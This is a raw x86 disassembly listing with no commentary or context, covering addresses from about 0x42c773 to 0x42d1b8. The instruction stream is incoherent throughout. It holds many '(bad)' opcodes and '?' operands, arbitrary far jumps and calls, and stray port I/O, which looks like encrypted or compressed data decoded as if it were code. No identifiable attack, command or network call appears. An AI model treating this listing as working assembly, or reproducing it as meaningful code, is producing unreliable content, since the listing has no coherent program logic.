  42c773:	adc    bl,ch
  42c775:	lock pop DWORD PTR [eax]
  42c778:	push   ebp
  42c779:	pop    ss
  42c77a:	jae    0x42c70d
  42c77c:	jg     0x42c7ad
  42c77e:	mov    cl,0xbf
  42c780:	in     al,dx
  42c781:	cwde   
  42c782:	sub    ebx,DWORD PTR [ebx]
  42c784:	(bad)  
  42c785:	xchg   edx,eax
  42c786:	test   esp,ebx
  42c788:	adc    ebp,edx
  42c78a:	loope  0x42c760
  42c78c:	mov    ds:0xccee727c,al
  42c791:	data16 or BYTE PTR [eax-0x74],ah
  42c795:	shl    DWORD PTR [ebx+0x45],1
  42c798:	cdq    
  42c799:	sub    al,0x6a
  42c79b:	mov    esp,0x566fcd97
  42c7a0:	fld    DWORD PTR [edx]
  42c7a2:	ja     0x42c75d
  42c7a4:	(bad)  
  42c7a5:	(bad)  
  42c7a6:	inc    ecx
  42c7a7:	xchg   ecx,eax
  42c7a8:	rol    DWORD PTR [esi+0x67],1
  42c7ab:	push   esi
  42c7ac:	add    BYTE PTR [edx+0x3f7564ad],dl
  42c7b2:	mov    al,0xfc
  42c7b4:	stc    
  42c7b5:	mov    dl,0xbb
  42c7b7:	out    dx,eax
  42c7b8:	push   cs
  42c7b9:	pop    ds
  42c7ba:	inc    ecx
  42c7bb:	std    
  42c7bc:	rcr    edx,cl
  42c7be:	aaa    
  42c7bf:	fiadd  WORD PTR [edi]
  42c7c1:	pushf  
  42c7c2:	repz clc 
  42c7c4:	add    al,BYTE PTR [edx]
  42c7c6:	jo     0x42c79a
  42c7c8:	push   eax
  42c7c9:	pop    ecx
  42c7ca:	or     al,0x2e
  42c7cc:	idiv   DWORD PTR [ebx]
  42c7ce:	push   edx
  42c7cf:	dec    eax
  42c7d0:	data16 lock into 
  42c7d3:	mov    eax,0xf7be4ef
  42c7d8:	xchg   esi,eax
  42c7d9:	push   ecx
  42c7da:	adc    BYTE PTR [eax],ah
  42c7dc:	jb     0x42c78a
  42c7de:	sub    eax,0xefec6dea
  42c7e3:	xchg   DWORD PTR [edi-0x5d],eax
  42c7e6:	adc    ecx,DWORD PTR [esi+0x5d290c2a]
  42c7ec:	mov    BYTE PTR [eax],al
	...
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	pop    esi
  42c863:	push   0xdc619292
  42c868:	add    DWORD PTR [eax],eax
  42c86a:	inc    DWORD PTR [eax]
  42c86c:	add    BYTE PTR [eax],al
  42c86e:	ins    DWORD PTR es:[edi],dx
  42c86f:	and    al,0x98
  42c871:	js     0x42c8c5
  42c873:	xor    BYTE PTR [ecx+0x67acb5c3],cl
  42c879:	pop    esi
  42c87a:	fdiv   QWORD PTR [edi]
  42c87c:	jns    0x42c87a
  42c87e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42c880:	into   
  42c881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c882:	mov    edx,0x24de6016
  42c887:	leave  
  42c888:	or     edx,DWORD PTR [ecx+0x48]
  42c88b:	and    al,0xb0
  42c88d:	repnz (bad) 
  42c88f:	aam    0x50
  42c891:	inc    esi
  42c892:	rol    BYTE PTR [ebx-0x26d0f7ef],cl
  42c898:	cmp    al,0xa
  42c89a:	xor    dl,BYTE PTR [edx-0x73]
  42c89d:	add    eax,0x6c872238
  42c8a2:	fldcw  WORD PTR [esi-0xfd8fb]
  42c8a8:	in     al,0xf5
  42c8aa:	cmc    
  42c8ab:	or     eax,0xff3677a0
  42c8b0:	xchg   ebp,eax
  42c8b1:	and    dh,BYTE PTR ds:0x4fe256d5
  42c8b7:	add    dl,BYTE PTR [ebx]
  42c8b9:	cmp    eax,0xc768e2fc
  42c8be:	xchg   edi,eax
  42c8bf:	xchg   edi,eax
  42c8c0:	aaa    
  42c8c1:	inc    esp
  42c8c2:	in     eax,0x79
  42c8c4:	dec    edi
  42c8c5:	shl    DWORD PTR [esi],cl
  42c8c7:	sbb    DWORD PTR [ecx+0x37a3bc28],edi
  42c8cd:	mov    ebx,0xa06d5aa4
  42c8d2:	aad    0xbd
  42c8d4:	(bad)  
  42c8d5:	repnz cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42c8d8:	cld    
  42c8d9:	xchg   ecx,eax
  42c8da:	call   0x5f5528db
  42c8df:	or     ecx,DWORD PTR [edi-0x3b]
  42c8e2:	add    BYTE PTR [esi-0x316c0538],0x7d
  42c8e9:	cmp    esi,esp
  42c8eb:	cs nop
  42c8ed:	inc    edi
  42c8ee:	push   ss
  42c8ef:	mov    ds:0x5645996b,eax
  42c8f4:	lods   eax,DWORD PTR ds:[esi]
  42c8f5:	mov    esp,0x3e941ea8
  42c8fa:	imul   esp,DWORD PTR [esi-0x5f0da414],0xee537c21
  42c904:	(bad)
  42c908:	add    al,0x1f
  42c90a:	xchg   ecx,eax
  42c90b:	sbb    eax,0x6690ec66
  42c910:	jge    0x42c970
  42c912:	jo     0x42c976
  42c914:	int    0x4b
  42c916:	or     bl,BYTE PTR [ecx+0x3a]
  42c919:	frstor [edi+0x95c2097]
  42c91f:	inc    ebx
  42c920:	xor    edx,DWORD PTR [edi-0xece83f1]
  42c926:	push   edx
  42c927:	dec    ebp
  42c928:	cs int3 
  42c92a:	(bad)  
  42c92b:	cmp    bl,BYTE PTR [ebx+0x25]
  42c92e:	sub    eax,0x33ddf369
  42c933:	add    eax,0x96ca7b0c
  42c938:	in     eax,dx
  42c939:	dec    ecx
  42c93a:	out    0xdc,al
  42c93c:	(bad)  
  42c93d:	cs gs iret 
  42c940:	cmp    DWORD PTR [ebp-0x15],edi
  42c943:	push   esp
  42c944:	fild   WORD PTR [esi]
  42c946:	push   ds
  42c947:	lods   eax,DWORD PTR ds:[esi]
  42c948:	out    0xf,al
  42c94a:	sub    al,0x8a
  42c94c:	ss sahf 
  42c94e:	ficomp WORD PTR [edi+edi*2+0x78]
  42c952:	pop    edx
  42c953:	add    edx,DWORD PTR [ecx]
  42c955:	adc    ch,BYTE PTR [ebx]
  42c957:	jne    0x42c9ad
  42c959:	inc    esi
  42c95a:	sti    
  42c95b:	jg     0x42c997
  42c95d:	fiadd  DWORD PTR [edx+0x2d]
  42c960:	jne    0x42c9a4
  42c962:	scas   eax,DWORD PTR es:[edi]
  42c963:	mov    DWORD PTR [ecx-0x5a],edi
  42c966:	(bad)  
  42c967:	cmp    eax,0x15431cac
  42c96c:	adc    DWORD PTR [eax],eax
	...
  42c9d6:	adc    BYTE PTR [ebx],bl
  42c9d8:	leave  
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0xcec35693
  42c9e6:	pusha  
  42c9e7:	fld    QWORD PTR [ecx]
  42c9e9:	add    bh,bh
  42c9eb:	add    BYTE PTR [eax],al
  42c9ed:	add    al,bl
  42c9ef:	push   ebx
  42c9f0:	stos   DWORD PTR es:[edi],eax
  42c9f1:	jge    0x42ca6c
  42c9f3:	sub    DWORD PTR [eax-0xb8255d0],0x2c
  42c9fa:	(bad)  
  42c9fb:	loope  0x42c9bf
  42c9fd:	mov    ds:0x9d7416fc,al
  42ca02:	ins    BYTE PTR es:[edi],dx
  42ca03:	cld    
  42ca04:	idiv   DWORD PTR [edi-0x517bebae]
  42ca0a:	mov    bl,0x23
  42ca0c:	cmp    al,0x1d
  42ca0e:	aas    
  42ca0f:	fs rcl bh,cl
  42ca12:	xor    ah,BYTE PTR [esi-0x26]
  42ca15:	gs dec esp
  42ca17:	push   0xcecb3263
  42ca1c:	inc    eax
  42ca1d:	ins    DWORD PTR es:[edi],dx
  42ca1e:	or     al,0xb4
  42ca20:	fs push 0x2c
  42ca23:	loope  0x42c9f0
  42ca25:	xlat   BYTE PTR ds:[ebx]
  42ca26:	jle    0x42c9dd
  42ca28:	(bad)  [ebp+0x72a2100e]
  42ca2e:	shr    ah,cl
  42ca30:	lock ret 0x2582
  42ca34:	push   0xa223b1e
  42ca39:	stc    
  42ca3a:	into   
  42ca3b:	jl     0x42ca7c
  42ca3d:	mov    ebp,0xb43adfba
  42ca42:	mov    ds:0xfbb10780,al
  42ca47:	das    
  42ca48:	or     DWORD PTR [esi],esp
  42ca4a:	rep lods eax,DWORD PTR ds:[esi]
  42ca4c:	xchg   esi,eax
  42ca4d:	lds    eax,FWORD PTR [esi+ebx*1]
  42ca50:	mov    fs,WORD PTR [ebp+edx*8+0x86bd773]
  42ca57:	fild   QWORD PTR [ebp-0x21]
  42ca5a:	aaa    
  42ca5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca5c:	dec    eax
  42ca5d:	frstor [edi]
  42ca5f:	sub    BYTE PTR [edx+edi*1],cl
  42ca62:	add    BYTE PTR [ebp+0x3a89791d],bh
  42ca68:	call   0x9c3897c3
  42ca6d:	in     al,0xce
  42ca6f:	xor    DWORD PTR [esi+0x56b53c60],edi
  42ca75:	in     eax,dx
  42ca76:	mov    ebx,0x4685027f
  42ca7b:	mov    dh,0x8a
  42ca7d:	add    ah,BYTE PTR [edx-0x5ea2bcab]
  42ca83:	call   ebx
  42ca85:	fimul  DWORD PTR [ebx-0x46b67028]
  42ca8b:	loopne 0x42ca79
  42ca8d:	jge    0x42ca49
  42ca8f:	fcomp  DWORD PTR [edi]
  42ca91:	push   0x6e859e76
  42ca96:	and    eax,0x2fc95343
  42ca9b:	das    
  42ca9c:	cli    
  42ca9d:	mov    ds:0x479678ea,al
  42caa2:	inc    esp
  42caa3:	les    eax,FWORD PTR [edx-0x67]
  42caa6:	jecxz  0x42caed
  42caa8:	dec    esp
  42caa9:	push   ss
  42caaa:	shl    DWORD PTR [ebx],1
  42caac:	imul   edi,DWORD PTR [eax+ecx*1-0x69],0x5d
  42cab1:	(bad)  
  42cab2:	cmp    DWORD PTR [ebp-0x3bb7a26f],eax
  42cab8:	xor    ch,BYTE PTR [ebp+0x2f]
  42cabb:	add    eax,0xaa089795
  42cac0:	int3   
  42cac1:	mov    ebx,0x98f107b7
  42cac6:	push   edx
  42cac7:	or     eax,0x88ba5ecf
  42cacc:	in     al,dx
  42cacd:	jmp    0xdaa6:0xf3bffee6
  42cad4:	jle    0x42cb45
  42cad6:	mov    ds:0x29bd9ab7,eax
  42cadb:	mov    edx,0x7db29fc7
  42cae0:	cld    
  42cae1:	push   ss
  42cae2:	cmp    BYTE PTR [esi],dl
  42cae4:	mov    ebp,0x6a438df4
  42cae9:	data16 sti 
  42caeb:	pushf  
  42caec:	xchg   edx,eax
	...
  42cb55:	add    BYTE PTR [edi-0x2be7726],ah
  42cb5b:	push   ebx
  42cb5c:	out    dx,eax
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp-0x22a89140]
  42cb64:	sub    ah,BYTE PTR [ecx]
  42cb66:	pop    edi
  42cb67:	fiadd  WORD PTR [ecx]
  42cb69:	add    bh,bh
  42cb6b:	add    BYTE PTR [eax],al
  42cb6d:	add    ah,al
  42cb6f:	xor    BYTE PTR [edx-0x3a],0xe5
  42cb73:	adc    DWORD PTR [edi-0x10ba6206],0xfb80fcb1
  42cb7d:	xchg   esi,eax
  42cb7e:	js     0x42cb3b
  42cb80:	int3   
  42cb81:	add    BYTE PTR [ebx+edx*1+0x5e],cl
  42cb85:	imul   ebp,edx,0xe36a9bc7
  42cb8b:	adc    eax,0x57e0bf00
  42cb90:	or     bl,ch
  42cb92:	jmp    0x162d0b46
  42cb97:	sub    ecx,ecx
  42cb99:	sub    esp,DWORD PTR [esp+ecx*8+0x486e66d5]
  42cba0:	mov    ah,0x4c
  42cba2:	xchg   ebx,eax
  42cba3:	adc    dh,BYTE PTR [esi]
  42cba5:	or     ah,BYTE PTR [ebx+ebx*8]
  42cba8:	outs   dx,BYTE PTR ds:[esi]
  42cba9:	out    dx,al
  42cbaa:	mov    ebx,0x7dc99bce
  42cbaf:	fpatan 
  42cbb1:	adc    bh,dh
  42cbb3:	sub    eax,0x35470a69
  42cbb8:	popa   
  42cbb9:	and    al,0x5f
  42cbbb:	push   ebp
  42cbbc:	push   ebx
  42cbbd:	sub    al,0x1f
  42cbbf:	jnp    0x42cb98
  42cbc1:	lods   al,BYTE PTR ds:[esi]
  42cbc2:	jne    0x42cb54
  42cbc4:	push   0x1170e079
  42cbc9:	shl    al,0x9a
  42cbcc:	cli    
  42cbcd:	sbb    eax,0x5f33dac2
  42cbd2:	aas    
  42cbd3:	and    ebp,DWORD PTR [ebx+eiz*1+0x46]
  42cbd7:	repnz retf 
  42cbd9:	int    0xf5
  42cbdb:	imul   esi,DWORD PTR [ebp+0x30e2ccdd],0xdbb1e0fc
  42cbe5:	mov    esp,?
  42cbe7:	cmc    
  42cbe8:	and    bh,0x6a
  42cbeb:	mov    WORD PTR [ecx+0x69],fs
  42cbee:	cwde   
  42cbef:	xchg   ebx,eax
  42cbf0:	sbb    ecx,DWORD PTR [esi+0x65]
  42cbf3:	les    esi,FWORD PTR [edx-0x2f]
  42cbf6:	pop    ds
  42cbf7:	lahf   
  42cbf8:	stos   BYTE PTR es:[edi],al
  42cbf9:	inc    edx
  42cbfa:	das    
  42cbfb:	mov    ebx,0x6fd17ad7
  42cc00:	test   al,0xc1
  42cc02:	in     eax,0xdd
  42cc04:	aaa    
  42cc05:	or     edi,ebp
  42cc07:	call   0x802:0x59b86cbd
  42cc0e:	mov    ebp,0x99d533cf
  42cc13:	std    
  42cc14:	mov    bl,0x93
  42cc16:	mov    al,ds:0x22548544
  42cc1b:	ins    BYTE PTR es:[edi],dx
  42cc1c:	aad    0xc3
  42cc1e:	jno    0x42cbe7
  42cc20:	hlt    
  42cc21:	popa   
  42cc22:	(bad)  
  42cc23:	sbb    eax,0x5858eef6
  42cc28:	dec    ebp
  42cc29:	dec    esi
  42cc2a:	shl    ebx,1
  42cc2c:	xchg   ebp,esp
  42cc2e:	lds    edi,FWORD PTR [edx]
  42cc30:	mov    bl,0x48
  42cc32:	jae    0x42cc54
  42cc34:	dec    eax
  42cc35:	mov    ebp,0x71c44f33
  42cc3a:	push   esi
  42cc3b:	fidiv  WORD PTR [ecx]
  42cc3d:	pop    ss
  42cc3e:	out    0xcd,eax
  42cc40:	(bad)  
  42cc41:	sbb    eax,0x40476428
  42cc46:	test   eax,0x7fcdc392
  42cc4b:	aad    0xd2
  42cc4d:	cmp    eax,0xd8f8e9de
  42cc52:	mov    ecx,0xbd444b63
  42cc57:	lods   al,BYTE PTR ds:[esi]
  42cc58:	inc    eax
  42cc59:	xchg   ecx,eax
  42cc5a:	cmc    
  42cc5b:	out    dx,eax
  42cc5c:	clc    
  42cc5d:	aad    0xcf
  42cc5f:	ja     0x42cc6a
  42cc61:	and    al,0x26
  42cc63:	dec    eax
  42cc64:	imul   esi,ecx,0x1bff19cc
  42cc6a:	mov    WORD PTR [eax+0xc9],es
	...
  42ccd4:	add    BYTE PTR [eax],al
  42ccd6:	jg     0x42ccda
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0xf63d7610
  42cce6:	pop    esi
  42cce7:	fild   WORD PTR [ecx]
  42cce9:	add    bh,bh
  42cceb:	add    BYTE PTR [eax],al
  42cced:	add    ch,bl
  42ccef:	mov    esi,0x33680207
  42ccf4:	jecxz  0x42cc83
  42ccf6:	fs dec ebx
  42ccf8:	mov    ds:0x5b52006c,al
  42ccfd:	cld    
  42ccfe:	add    eax,0x2aba60c7
  42cd03:	popa   
  42cd04:	into   
  42cd05:	or     eax,0x223caa26
  42cd0a:	cmp    DWORD PTR [ebp+0x629957fc],0xe15b98a8
  42cd14:	jg     0x42cd4e
  42cd16:	cmp    ebp,edx
  42cd18:	mov    al,ds:0x28ea771e
  42cd1d:	mov    ecx,0xdf74063e
  42cd22:	mov    bh,0x43
  42cd24:	inc    esp
  42cd25:	cdq    
  42cd26:	sub    al,0x3a
  42cd28:	ror    BYTE PTR [ecx-0x39],cl
  42cd2b:	retf   
  42cd2c:	scas   eax,DWORD PTR es:[edi]
  42cd2d:	jmp    0x8ea1:0x5be7b6a0
  42cd34:	pop    ebp
  42cd35:	mov    ?,WORD PTR [esi+0x4]
  42cd38:	mov    bl,0xbe
  42cd3a:	sub    edi,DWORD PTR [ecx]
  42cd3c:	inc    ecx
  42cd3d:	jecxz  0x42cda2
  42cd3f:	ja     0x42cdb6
  42cd41:	mov    ebp,DWORD PTR [edi+edi*8]
  42cd44:	es aas 
  42cd46:	xor    eax,DWORD PTR [edx]
  42cd48:	dec    ebx
  42cd49:	push   ds
  42cd4a:	mov    DWORD PTR ds:0x49a4a5ec,esp
  42cd50:	enter  0x2dc7,0x79
  42cd54:	push   0x32be67f0
  42cd59:	sbb    ah,BYTE PTR [edx]
  42cd5b:	and    al,0x54
  42cd5d:	sub    al,0xe1
  42cd5f:	ds pop esi
  42cd61:	sub    BYTE PTR [esi],dh
  42cd63:	shr    BYTE PTR [esi+0xd0d17],cl
  42cd69:	xor    DWORD PTR [ebx+0x50f17fcf],esi
  42cd6f:	fstp   st(1)
  42cd71:	(bad)  
  42cd72:	push   esp
  42cd73:	cs call 0x9e895fce
  42cd79:	jmp    0x42cd96
  42cd7b:	cli    
  42cd7c:	aad    0xf5
  42cd7e:	jbe    0x42cdac
  42cd80:	(bad)  
  42cd82:	lods   eax,DWORD PTR ds:[esi]
  42cd83:	(bad)  
  42cd84:	jno    0x42cd15
  42cd86:	jg     0x42cd5d
  42cd88:	ret    
  42cd89:	scas   eax,DWORD PTR es:[edi]
  42cd8a:	sbb    BYTE PTR [ebp-0xc],dh
  42cd8d:	repz fisubr WORD PTR [edi+0x3d]
  42cd91:	dec    esp
  42cd92:	cmp    eax,0x532d4eb9
  42cd97:	outs   dx,DWORD PTR ds:[esi]
  42cd98:	pop    eax
  42cd99:	cmc    
  42cd9a:	dec    ebp
  42cd9b:	and    esi,DWORD PTR [eax+eax*2+0x5a592693]
  42cda2:	xor    edi,DWORD PTR [edi-0x60a93413]
  42cda8:	dec    edx
  42cda9:	push   esi
  42cdaa:	scas   eax,DWORD PTR es:[edi]
  42cdab:	aam    0x86
  42cdad:	jb     0x42cd4b
  42cdaf:	push   eax
  42cdb0:	push   ds
  42cdb1:	ret    
  42cdb2:	adc    eax,0xed7b4f3b
  42cdb7:	jo     0x42cd95
  42cdb9:	mov    dl,0x38
  42cdbb:	and    DWORD PTR [ecx+eax*2],edi
  42cdbe:	xor    eax,0xfbb3dd48
  42cdc3:	push   cs
  42cdc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cdc5:	push   edx
  42cdc6:	test   eax,0x2d1276ce
  42cdcb:	fisub  DWORD PTR [edx]
  42cdcd:	mov    DWORD PTR [ecx-0x27],ebx
  42cdd0:	cmp    DWORD PTR [ebx+ecx*4+0x4780095c],ebx
  42cdd7:	sub    edx,edi
  42cdd9:	jge    0x42cd80
  42cddb:	add    eax,0x78b25902
  42cde0:	lds    eax,FWORD PTR [esi]
  42cde2:	repnz les ecx,FWORD PTR [esi+0x727cba8b]
  42cde9:	push   ecx
  42cdea:	inc    edi
  42cdeb:	out    0x26,eax
	...
  42ce55:	add    BYTE PTR [ecx],bl
  42ce57:	mov    eax,ds:0xdffe87fe
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0xc3
  42ce63:	aam    0xbc
  42ce65:	js     0x42cec4
  42ce67:	loopne 0x42ce6a
  42ce69:	add    bh,bh
  42ce6b:	add    BYTE PTR [eax],al
  42ce6d:	add    bh,dl
  42ce6f:	in     eax,0xbe
  42ce71:	mov    cs,esp
  42ce73:	ret    
  42ce74:	or     DWORD PTR [esi-0xe],esi
  42ce77:	addr16 test al,0xa6
  42ce7a:	ss jle 0x42ce4f
  42ce7d:	test   DWORD PTR [ecx+0x7df0555],eax
  42ce83:	xchg   DWORD PTR [ebx+ecx*8-0x647c79c7],ebx
  42ce8a:	imul   edi,DWORD PTR [ebx-0x5b50b990],0x31
  42ce91:	rcl    DWORD PTR [esi+0x50],0x51
  42ce95:	jmp    0x42cee8
  42ce97:	js     0x42ce42
  42ce99:	xlat   BYTE PTR ds:[ebx]
  42ce9a:	xor    eax,0xa7ec7ec4
  42ce9f:	imul   BYTE PTR [ecx+0x51]
  42cea2:	pop    esi
  42cea3:	jo     0x42ce3c
  42cea5:	pop    ss
  42cea6:	add    eax,0xd253e2aa
  42ceab:	xchg   esi,eax
  42ceac:	push   esp
  42cead:	adc    ebp,DWORD PTR [ebx]
  42ceaf:	xchg   ebp,eax
  42ceb0:	sbb    DWORD PTR [esi-0x5d00d7b8],ebp
  42ceb6:	jns    0x42cf2a
  42ceb8:	mov    ebx,DWORD PTR [ecx]
  42ceba:	cmc    
  42cebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cebc:	(bad)  
  42cebd:	in     al,0xe2
  42cebf:	jno    0x42ce5f
  42cec1:	lock pop ss
  42cec3:	cmc    
  42cec4:	mov    edx,0x62be63a0
  42cec9:	stc    
  42ceca:	add    eax,0x48da4b0d
  42cecf:	xchg   ecx,eax
  42ced0:	test   eax,0x139456e0
  42ced5:	cmp    DWORD PTR [ecx+0x22],0x371aaf96
  42cedc:	js     0x42cee1
  42cede:	pop    ss
  42cedf:	call   0xe10b:0xec4a8057
  42cee6:	rcl    DWORD PTR [ebx],1
  42cee8:	pop    ebx
  42cee9:	fidivr DWORD PTR [ecx+0x36]
  42ceec:	sub    eax,0xeaf9aa61
  42cef1:	ficom  WORD PTR [ebx-0x116091ac]
  42cef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cef8:	ja     0x42cef8
  42cefa:	cmp    al,0xcc
  42cefc:	dec    ecx
  42cefd:	push   esp
  42cefe:	sub    DWORD PTR [esi+0x5850949c],0x7d
  42cf05:	cmc    
  42cf06:	cs pop eax
  42cf08:	mov    dh,0xe9
  42cf0a:	shr    BYTE PTR [ebx+0x4b126caf],0x53
  42cf11:	xchg   dh,dl
  42cf13:	mov    ch,0x34
  42cf15:	stos   BYTE PTR es:[edi],al
  42cf16:	call   0xae42:0xad730787
  42cf1d:	(bad)  
  42cf1e:	mov    bl,0x11
  42cf20:	in     eax,0x48
  42cf22:	add    eax,0xc557946a
  42cf27:	xchg   ebx,eax
  42cf28:	lds    esp,FWORD PTR [ebx]
  42cf2a:	inc    edi
  42cf2b:	mov    eax,ds:0xb66ecf4d
  42cf30:	or     al,0x65
  42cf32:	in     eax,0x63
  42cf34:	xchg   ebp,eax
  42cf35:	test   al,0x25
  42cf37:	addr16 retf 0x7559
  42cf3b:	dec    ecx
  42cf3c:	adc    al,0x89
  42cf3e:	mov    edx,0x60e25c6e
  42cf43:	jmp    0x59633f24
  42cf48:	and    al,0x9d
  42cf4a:	or     ebp,ecx
  42cf4c:	jb     0x42cf80
  42cf4e:	fdiv   st,st(6)
  42cf50:	pop    edi
  42cf51:	out    0xeb,eax
  42cf53:	push   ss
  42cf54:	dec    eax
  42cf55:	sub    eax,DWORD PTR [ebx-0x75]
  42cf58:	in     eax,dx
  42cf59:	pop    eax
  42cf5a:	sub    DWORD PTR [eax],0xffffffd7
  42cf5d:	std    
  42cf5e:	dec    ecx
  42cf5f:	pop    edx
  42cf60:	gs test eax,0xc28e84f
  42cf66:	test   al,0x79
  42cf68:	sti    
  42cf69:	clc    
  42cf6a:	adc    edx,DWORD PTR [ecx]
  42cf6c:	adc    DWORD PTR [eax],eax
	...
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    ebx,FWORD PTR [eax]
  42cfe3:	fs jbe 0x42cf8f
  42cfe6:	pop    esp
  42cfe7:	loope  0x42cfea
  42cfe9:	add    bh,bh
  42cfeb:	add    BYTE PTR [eax],al
  42cfed:	add    BYTE PTR [esi],al
  42cfef:	neg    BYTE PTR [ebx+eiz*1]
  42cff2:	dec    ebp
  42cff3:	test   al,0x63
  42cff5:	hlt    
  42cff6:	jbe    0x42d008
  42cff8:	std    
  42cff9:	je     0x42cfa1
  42cffb:	xor    DWORD PTR [eax+0x3d],0x9bfa5411
  42d002:	nop
  42d003:	std    
  42d004:	scas   eax,DWORD PTR es:[edi]
  42d005:	xchg   edi,eax
  42d006:	jl     0x42cfeb
  42d008:	hlt    
  42d009:	ins    BYTE PTR es:[edi],dx
  42d00a:	xchg   esi,eax
  42d00b:	arpl   WORD PTR [ebp-0x7ba9079c],di
  42d011:	cwde   
  42d012:	jo     0x42cfec
  42d014:	aad    0xff
  42d016:	inc    esp
  42d017:	mov    eax,ds:0xbc4a0ca6
  42d01c:	and    dh,BYTE PTR [esi+0x2df882cb]
  42d022:	or     DWORD PTR [ecx+0x62a11a43],ebp
  42d028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d029:	push   es
  42d02a:	(bad)  
  42d02b:	(bad)
  42d02e:	mov    WORD PTR [ecx+eiz*4-0x1a767b1f],ds
  42d035:	fiadd  WORD PTR [ebx+0x35]
  42d038:	shl    DWORD PTR [edi+0x7b],1
  42d03b:	sbb    eax,0x50a93dc
  42d040:	shr    BYTE PTR [edx],1
  42d042:	bound  esi,QWORD PTR [ebp+0x79]
  42d045:	dec    edi
  42d046:	mov    eax,0x36958ab
  42d04b:	add    bh,BYTE PTR [eax]
  42d04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d04e:	mov    dl,0xd1
  42d050:	loop   0x42d008
  42d052:	sbb    al,0x9c
  42d054:	test   DWORD PTR [edx-0x2d],ecx
  42d057:	shl    DWORD PTR [esi],cl
  42d059:	add    ebx,eax
  42d05b:	sub    edi,DWORD PTR [edi+ecx*1-0x24efce77]
  42d062:	sub    ebp,DWORD PTR [edx+0x62]
  42d065:	push   ebp
  42d066:	call   0x64f0b2df
  42d06b:	mov    al,ds:0x1dd24a28
  42d070:	aam    0xef
  42d072:	mov    eax,ds:0x3adcaf29
  42d077:	cli    
  42d078:	sti    
  42d079:	xchg   esi,eax
  42d07a:	scas   al,BYTE PTR es:[edi]
  42d07b:	leave  
  42d07c:	daa    
  42d07d:	sbb    ebx,DWORD PTR [ecx-0x1b2931a3]
  42d083:	cmp    ebx,DWORD PTR [ebx]
  42d085:	mov    ds:0x292aa665,al
  42d08a:	xchg   DWORD PTR [esi-0x309dbbde],edi
  42d090:	das    
  42d091:	in     al,dx
  42d092:	popa   
  42d093:	stos   DWORD PTR es:[edi],eax
  42d094:	xor    eax,0xab94d070
  42d099:	add    BYTE PTR [ebx+0x27d0b670],al
  42d09f:	sbb    bl,BYTE PTR [ebp-0x22]
  42d0a2:	add    BYTE PTR [eax-0x318224a],dh
  42d0a8:	imul   DWORD PTR [ebx-0x35]
  42d0ab:	(bad)  
  42d0ac:	xlat   BYTE PTR ds:[ebx]
  42d0ad:	imul   esp,ebp,0x962f42cc
  42d0b3:	push   0xf6141b44
  42d0b8:	inc    ch
  42d0ba:	push   0xfffffff0
  42d0bc:	test   al,0x82
  42d0be:	cmc    
  42d0bf:	pop    eax
  42d0c0:	push   0x8
  42d0c2:	aas    
  42d0c3:	pop    edi
  42d0c4:	test   BYTE PTR [edi],dl
  42d0c6:	adc    BYTE PTR [edi+0x19],bh
  42d0c9:	pop    edx
  42d0ca:	sbb    DWORD PTR [esi],edx
  42d0cc:	rol    BYTE PTR [edi],0x8
  42d0cf:	pop    edi
  42d0d0:	cmp    eax,0x19ac388a
  42d0d5:	call   0xf801:0x84da5295
  42d0dc:	arpl   WORD PTR [esi-0xc],bp
  42d0df:	ja     0x42d14e
  42d0e1:	push   edx
  42d0e2:	pop    ecx
  42d0e3:	ret    0xf528
  42d0e6:	mov    bl,0xd7
  42d0e8:	or     esi,DWORD PTR [ebp-0x1d]
  42d0eb:	inc    edx
  42d0ec:	std    
	...
  42d155:	add    BYTE PTR [eax+0x3a],dl
  42d158:	(bad)  
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [esi+edx*4],cl
  42d164:	add    BYTE PTR [esi+0x1e25b],bl
  42d16a:	inc    DWORD PTR [eax]
  42d16c:	add    BYTE PTR [eax],al
  42d16e:	ss mov edx,0xcd51141c
  42d174:	jecxz  0x42d151
  42d176:	sub    BYTE PTR [ecx],0x8b
  42d179:	mov    ecx,0x3e01f44c
  42d17e:	or     DWORD PTR [esi],ebx
  42d180:	inc    ecx
  42d181:	clc    
  42d182:	jb     0x42d116
  42d184:	shr    DWORD PTR [esi+ebx*2],1
  42d187:	push   es
  42d188:	sbb    eax,0x2a374241
  42d18d:	mov    ebx,0xf8622bf5
  42d192:	(bad)  
  42d193:	test   al,0xdf
  42d195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d196:	lods   eax,DWORD PTR ds:[esi]
  42d197:	jecxz  0x42d208
  42d199:	xor    eax,ebx
  42d19b:	xchg   DWORD PTR [ebx-0x2],edx
  42d19e:	inc    eax
  42d19f:	mov    eax,ds:0xf27e074f
  42d1a4:	pop    edx
  42d1a5:	jl     0x42d18e
  42d1a7:	in     eax,dx
  42d1a8:	jecxz  0x42d15f
  42d1aa:	inc    ebp
  42d1ab:	fisub  WORD PTR ds:0x11b1f7f9
  42d1b1:	ds mov eax,gs:0x755868c
  42d1b8:	outs   dx,BYTE PTR ds:[esi]
